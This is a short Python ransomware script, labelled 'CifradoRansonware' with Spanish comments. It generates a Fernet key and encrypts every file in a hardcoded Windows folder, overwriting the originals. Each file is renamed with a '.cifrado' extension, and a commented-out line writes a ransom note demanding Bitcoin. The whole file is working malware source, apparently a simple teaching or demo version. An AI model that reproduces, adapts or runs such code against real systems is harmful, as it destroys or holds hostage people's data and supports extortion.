#######################################################

# CifradoRansonware:

#######################################################

from cryptography.fernet import Fernet

import os

#######################################################

# Extension de los Archivos Secuestrados
extension = 'cifrado'

# Generacion de la llave de cifrado
def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

# Cargar la llave generada
def cargar_key():
    return open('key.key', 'rb').read()

# Cifrar y renombrar los Archivos
def cifrar(items, key):
    f = Fernet(key)
    for item in items:
        # Leo el archivo
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        # Escribo el archivo
        with open(item, 'wb') as file: 
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)
        
        print('Cifrado Exitoso')

if __name__ == '__main__':
    path_to_encrypt = 'C:/CifradoDecifradoDatos/'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '\\' + item for item in items]
    
    generar_key()
    key = cargar_key()
    cifrar(full_path, key)

    #with open(path_to_encrypt + '\\README.txt', 'w') as file:
    #    file.write('Pague Bitcoins')
